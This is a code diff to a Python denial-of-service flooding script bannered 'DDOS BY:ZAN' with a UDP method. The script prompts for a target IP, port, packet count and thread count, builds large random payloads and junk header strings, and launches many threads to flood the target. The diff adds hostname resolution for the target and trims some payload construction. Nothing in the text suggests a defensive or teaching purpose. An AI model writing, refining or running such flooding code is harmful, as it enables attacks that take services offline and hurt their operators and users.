@@ -315,6 +315,7 @@ print(""" | DDOS |  METHOD  | | DDOS BY:ZAN |
               |   UDP    |
               """)
 ip = str(input("IP ATTACK>="))
+ip = socket.gethostbyname(ip)
 port = int(input("PORT >= "))
 pack = int(input("[ ? ] how long do you want Packet/s >="))
 th = int(input("[ ? ] how long do you want Thread/t >="))
@@ -342,7 +343,7 @@ def start():
   hh = random._urandom(999999)
   xx = int(0)
   nolakall = "IpAll: "+random.choice(all)+random.choice(userip)+"\r\n"
-  sockall = "Socks: "+random.choice(socks5)+random.choice(all)+random.choice(userip)+random.choice(useragents)+random.choice(acceptall)+"\r\n"
+  sockall = random.choice(socks5)+"\r\n"
   lolall = random.choice(useragents)+random.choice(userip)+"\r\n"
   agentall = "UserAgents: "+random.choice(useragents)+random.choice(userip)+random.choice(all)+random.choice(socks5)+random.choice(acceptall)+"\r\n"
   cekall = "Bantai: "+random.choice(all)+random.choice(userip)+random.choice(acceptall)+"\r\n"
@@ -366,6 +367,5 @@ def start():
             print('[+] server error')
 
 for x in range(th):
-    tt = random._urandom(100000)
     thred = threading.Thread(target=start)
     thred.start()
